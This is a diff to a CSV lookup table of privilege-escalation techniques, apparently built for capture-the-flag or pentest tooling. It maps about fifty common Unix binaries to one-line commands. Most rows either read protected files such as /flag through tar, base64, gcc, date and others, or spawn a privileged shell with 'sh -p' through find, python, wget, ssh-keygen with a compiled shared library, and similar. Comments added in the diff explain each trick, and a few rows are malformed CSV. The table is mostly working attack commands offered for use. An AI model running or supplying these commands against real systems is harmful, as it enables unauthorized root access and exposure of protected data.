@@ -1,57 +1,57 @@
-id,name,cmd,type,notes,
-1,cat,cat '$FILE',File Read,,
-2,more,more '$FILE',File Read,,
-3,less,less '$FILE',File Read,,
-4,tail,tail '$FILE',File Read,,
-5,head,head '$FILE',File Read,,
-6,sort,sort -m  '$FILE',File Read,,
-7,vim.basic,vim  '$FILE',File Read,, 
-8,vim,vim  '$FILE',File Read,,
-9,emacs-gtk,emacs  '$FILE',File Read,,
-10,emacs ,emacs  '$FILE',File Read,,
-11,nano,nano '$FILE',File Read,,
-12,rev,rev '$FILE' | rev,File Read,,
-13,od,od -An -c -w999 '$FILE',File Read,,
-14,hexdump,hd '$FILE',File Read,,
-15,hd,hd '$FILE',File Read,,
-16,xxd,xxd '$FILE'| xxd -r,File Read,,
-17,base32,base32 '$FILE' | base32  -d,File Read,,
-18,base64,base64 '$FILE' | base64 -d,File Read,,
-19,split,split '$FILE' pwnout;cat pwnoutaa; rm pwnoutaa -f,File Read,,
-20,gzip,gzip -f '$FILE' -t,File Read,,
-21,bzip2, bzip2 -c '$FILE' | bzip2 -d,File Read,,
-22,zip,zip pwnout.zip '$FILE';unzip -p pwnout.zip;rm -f pwnout.zip,File Read,,
-23,tar,tar -c '$FILE'  | tar -xO;tar xf /flag -I '/bin/sh -c 'cat 1>&2'',File Read,,
-24,x86_64-linux-gnu-ar,ar r '$FILE.ar' '$FILE'; ar p '$FILE.ar';rm -f '$FILE.ar' ,File Read,,
-25,ar,ar r '$FILE.ar' '$FILE';ar p '$FILE.ar',File Read,,
-26,cpio,echo '$FILE' |cpio -o,File Read,,
-27,genisoimage,genisoimage -sort '$FILE',File Read,,
-28,env,env sh -p,Gain Root Access,,
-29,find,find . -exec /bin/sh -p \; -quit ,Gain Root Access,,
-30,make,"echo  -e ""x:\n\t/bin/sh -p"" > makefile; make;",Gain Root Access,,
-31,nice ,nice sh -p,Gain Root Access,,
-32,timeout,timeout 7d /bin/sh -p,Gain Root Access,please run this commnad => timeout 7d /bin/sh -p,
-33,stdbuf,stdbuf -i0 /bin/sh -p,Gain Root Access,,
-34,setarch,setarch $(arch) /bin/sh -p,Gain Root Access,,
-35,watch,watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',Gain Root Access,,
-36,socat,socat stdin exec:'sh -p',Gain Root Access,,
-37,whiptail,whiptail --textbox --scrolltext '$FILE' 10 100,File Read,,
-38,awk ,awk '//' '$FILE',File Read,,
-39,mawk ,awk '//' '$FILE',File Read,,
-40,sed,sed -e '' '$FILE',File Read,,
-41,ed,ed '$FILE',File Read, to read the file please press "p" and to quit press "q",
-42,chown,chown $(id -un):$(id -gn) '$FILE';cat '$FILE',File Read,,
-43,chmod,chmod 6777 '$FILE'; cat '$FILE',File Read,,
-44,cp,cp '$FILE' /dev/stdout,File Read,,
-45,mv,mv /bin/sh /bin/mv ;mv -p,Gain Root Access,,
-47,perl,perl -wne print '$FILE',File Read,,
-48,python,"python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",Gain Root Access,,
-49,ruby,echo  "system('/bin/sh -p')" > rubytmp.rb; ruby rubytmp.rb;rm rubytmp.rb ; ,Gain Root Access,,
-50,bash,bash -p ,Gain Root Access,,
-51,date,date -f '$FILE',File Read,,
-52,dmesg,dmesg -F '$FILE',File Read,,
-53,wc,wc --files0-from '$FILE',File Read,,
-54,gcc,gcc -x c '$FILE',File Read,,
-55,as,as '$FILE',File Read,,
-56,wget,TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF;wget --use-askpass=$TF 0;,Gain Root Access,,
-57,ssh-keygen,"echo  '#include <unistd.h>\nvoid C_GetFunctionList()\n{\n\tchar *binaryPath = ""/usr/bin/bash"";\n\tchar *args[] = {binaryPath ,""-p"", NULL};\n\texecv(binaryPath, args);\nreturn ;\n}'  > file.c;gcc -c -Wall -Werror -fpic file.c;gcc -shared -o file.so file.o;ssh-keygen -D ./file.so"; ,Gain Root Access,
+id,name,cmd,type,notes,comments
+1,cat,cat '$FILE',File Read,,Cat - concatenate files and print on the standard output
+2,more,more '$FILE',File Read,,More - file perusal filter for crt viewing
+3,less,less '$FILE',File Read,,Less - opposite of file perusal filter for crt viewing
+4,tail,tail -n 1000 '$FILE',File Read,,Tail - output the last part  n lines of files {n = 1000}
+5,head,head -n 1000 '$FILE',File Read,,Head - output the first n lines part of files {n = 1000}
+6,sort,sort -m  '$FILE',File Read,,Use sort with -m merge already sorted files; do not sort
+7,vim.basic,vim  '$FILE',File Read,,Use vim  to open the file in a programmer's text editor
+8,vim,vim  '$FILE',File Read,,Use vim  to open the file in a programmer's text editor
+9,emacs-gtk,emacs  '$FILE',File Read,,Use emacs to open the file 
+10,emacs ,emacs  '$FILE',File Read,,Use emacs to open the file 
+11,nano,nano '$FILE',File Read,,Use nano to open the file 
+12,rev,rev '$FILE' | rev,File Read,, Use rev to reverse lines two times to read the file
+13,od,od -An -c -w999 '$FILE',File Read,,Read the file with od by dumping the files in octal and other formats
+14,hexdump,hd '$FILE',File Read,, Use hd to read file by dumping it into hexa
+15,hd,hd '$FILE',File Read,,Use hd to read file by dumping it into hexa
+16,xxd,xxd '$FILE'| xxd -r,File Read,,Read the file by makeing a hexdump then do the reverse.
+17,base32,base32 '$FILE' | base32  -d,File Read,,Read the file by encoding it then decoding 
+18,base64,base64 '$FILE' | base64 -d,File Read,,Read the file by encoding it then decoding
+19,split,split '$FILE' pwnout;cat pwnouta*; rm pwnoutaa -f,File Read,,"Output pieces of FILE to PREFIXaa", PREFIXab", ...; default size is 1000 lines and default PREFIX is 'x'."
+20,gzip,gzip -f '$FILE' -t,File Read,,Read the file after compressing it -f for Force  compression or decompression even if the file and -t  Test. Check the compressed file integrity.
+21,bzip2, bzip2 -c '$FILE' | bzip2 -d,File Read,,Read the file by compressing then expanding it
+22,zip,zip pwnout.zip '$FILE';unzip -p pwnout.zip;rm -f pwnout.zip,File Read,,Read the file by compressing then expanding it
+23,tar,tar -c '$FILE'  | tar -xO;tar xf /flag -I '/bin/sh -c 'cat 1>&2'',File Read,,Read the file by compressing then expanding it
+24,x86_64-linux-gnu-ar,ar r '$FILE.ar' '$FILE'; ar p '$FILE.ar';rm -f '$FILE.ar' ,File Read,,Read the file by compressing then expanding it
+25,ar,ar r '$FILE.ar' '$FILE';ar p '$FILE.ar',File Read,,Read the file by compressing then expanding it
+26,cpio,echo '$FILE' |cpio -o,File Read,,Read file by copying it from archive
+27,genisoimage,genisoimage -sort '$FILE',File Read,,Read file by using the optin -sort to Sort file locations on the media
+28,env,env sh -p,Gain Root Access,,Gainning an root access by  runnin a shell in a modified environment using env
+29,find,find . -exec /bin/sh -p \; -quit ,Gain Root Access,,Gainning root access by using the -exec option which runs a specified command
+30,make,"echo  -e ""x:\n\t/bin/sh -p"" > makefile; make;",Gain Root Access,,Gainning a root access by runnig a makefile that runs a shell
+31,nice ,nice sh -p,Gain Root Access,,Gainning root access by  running a shell with modified scheduling priority using nice
+32,timeout,timeout 7d /bin/sh -p,Gain Root Access,please run this commnad => timeout 7d /bin/sh -p,Gainning root access for limited duration by runnig a shell with a time limit using timeout
+33,stdbuf,stdbuf -i0 /bin/sh -p,Gain Root Access,,Gain root access by  Run shell with modified buffering operations for its standard streams using stdbuf
+34,setarch,setarch $(arch) /bin/sh -p,Gain Root Access,,Gainning root access by modiding the execution domains and process personality flags for the shell program 
+35,watch,watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',"Gain Root Access,,Gainning root access by running a shell eriodically", showing output fullscreen the -x option Pass command to exec(2) and -p  Make  watch attempt to run command every --interval seconds"
+36,socat,socat stdin exec:'sh -p',Gain Root Access,,Gainning root access by using the -exec option to run a shell
+37,whiptail,whiptail --textbox --scrolltext '$FILE' 10 100,File Read,,Read a file by presnting it in message box
+38,awk ,awk '//' '$FILE',File Read,,Read a file using the awk language that used in manipulation of the data 
+39,mawk ,awk '//' '$FILE',File Read,,Read a file using the awk language that used in manipulation of the data 
+40,sed,sed -e '' '$FILE',File Read,,Read a file by passing it sed as input stream without editing it 
+41,ed,ed '$FILE',File Read, to read the file please press "p" and to quit press "q",Read a file in with ed GNU  ed  is a line-oriented text editor. It is used to create, display, modify and otherwise manipulate text files,
+42,chown,chown $(id -un):$(id -gn) '$FILE';cat '$FILE',File Read,,Read the file by changing it's owner 
+43,chmod,chmod 6777 '$FILE'; cat '$FILE',File Read,, Read a file by changing it's permitions
+44,cp,cp '$FILE' /dev/stdout,File Read,,Read a file by copying it's content to the standard output
+45,mv,mv /bin/sh /bin/mv ;mv -p,Gain Root Access,,THIS IS NOT WORKING FOR NOW 
+47,perl,perl -wne print '$FILE',File Read,,Read a file using perl code 
+48,python,"python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",Gain Root Access,,Gainning root access by runnig python script that runs a shell 
+49,ruby,echo  "system('/bin/sh -p')" > rubytmp.rb; ruby rubytmp.rb;rm rubytmp.rb ; ,Gain Root Access,,Gainning root access by runnig ruby script that runs a shell 
+50,bash,bash -p ,Gain Root Access,,Gainning root access by runnig a shell 
+51,date,date -f '$FILE',File Read,,Read a file with date command using -f optin that read the file as date file 
+52,dmesg,dmesg -F '$FILE',File Read,,Read file data as syslog  messages from the given file
+53,wc,wc --files0-from '$FILE',File Read,,Read file using --files0-from option to read input from the files specified by NUL-terminated names in file F; If F is - then read names from standard input
+54,gcc,gcc -x c '$FILE',File Read,,Read file by using gcc to read the file as c file and print the out as an error message
+55,as,as '$FILE',File Read,,Read file by using as to read the file as assemply  file and print the out as an error message
+56,wget,TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF;wget --use-askpass=$TF 0;,Gain Root Access,,Gainning root access using the -e option to run a shell as if it were a part of  wgetrc. to 
+57,ssh-keygen,"echo  '#include <unistd.h>\nvoid C_GetFunctionList()\n{\n\tchar *binaryPath = ""/usr/bin/bash"";\n\tchar *args[] = {binaryPath ,""-p"", NULL};\n\texecv(binaryPath, args);\nreturn ;\n}'  > file.c;gcc -c -Wall -Werror -fpic file.c;gcc -shared -o file.so file.o;ssh-keygen -D ./file.so"; ,Gain Root Access,,
